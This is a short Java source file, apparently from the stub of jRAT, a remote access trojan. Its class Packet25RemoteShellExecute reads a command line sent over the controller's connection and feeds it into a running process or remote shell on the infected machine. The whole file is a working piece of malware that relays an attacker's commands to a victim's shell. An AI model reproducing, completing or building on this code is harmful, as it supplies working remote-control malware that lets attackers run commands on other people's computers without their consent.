package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.LaunchProcess;
import io.jrat.stub.RemoteShell;

import java.io.PrintWriter;


public class Packet25RemoteShellExecute extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String line = Connection.readLine();

		if (LaunchProcess.latest != null) {
			PrintWriter input = new PrintWriter(LaunchProcess.latest.p.getOutputStream(), true);
			input.println(line);
		} else if (RemoteShell.p != null) {
			PrintWriter input = new PrintWriter(RemoteShell.p.getOutputStream(), true);
			input.println(line);
		}
	}

}
